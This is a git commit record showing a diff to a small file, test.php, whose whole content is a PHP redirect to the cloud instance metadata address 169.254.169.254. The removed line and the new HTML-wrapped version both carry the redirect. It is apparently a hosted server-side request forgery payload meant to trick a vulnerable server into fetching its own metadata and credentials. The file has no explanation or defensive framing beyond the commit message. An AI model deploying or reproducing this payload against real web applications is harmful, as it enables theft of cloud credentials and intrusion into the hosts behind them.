91ada371836829b1b698c2de6229308abd8ad1b7
Tarun Garg <45597781+tarungarg1999@users.noreply.github.com>
2021-07-10 16:57:07 +0530

    Update test.php

--- test.php
+++ test.php
@@ -1,1 +1,4 @@
-<?php header('Location: http://169.254.169.254/latest/meta-data/', TRUE, 303); ?>
+<html><body>
+echo "<?php header('Location: http://169.254.169.254/latest/meta-data/', TRUE, 303); ?>"
+  </body>
+</html>
